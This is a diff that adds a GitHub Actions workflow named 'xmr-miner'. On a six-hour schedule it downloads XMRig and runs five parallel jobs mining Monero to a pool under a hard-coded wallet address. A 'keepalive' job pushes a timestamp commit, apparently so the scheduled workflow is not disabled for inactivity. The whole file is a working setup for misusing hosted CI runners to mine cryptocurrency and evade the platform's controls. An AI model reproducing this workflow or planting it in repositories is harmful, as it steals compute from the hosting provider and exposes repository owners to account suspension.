@@ -1,0 +1,43 @@
+name: xmr-miner
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+permissions:
+  contents: write
+
+concurrency:
+  group: xmr-miner
+  cancel-in-progress: false
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      fail-fast: false
+      matrix:
+        worker: [1, 2, 3, 4, 5]
+    steps:
+      - name: Mine
+        continue-on-error: true
+        run: |
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          sudo sysctl -w vm.nr_hugepages=1280
+          timeout 20700 ./xmrig -o gulf.moneroocean.stream:10001 -u 41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH -p gh-${{ matrix.worker }} -k --coin monero --donate-level 1 || true
+
+  keepalive:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          date > last-run.txt
+          git config user.name "github-actions"
+          git config user.email "actions@github.com"
+          git add last-run.txt
+          git commit -m "keepalive" || exit 0
+          git push
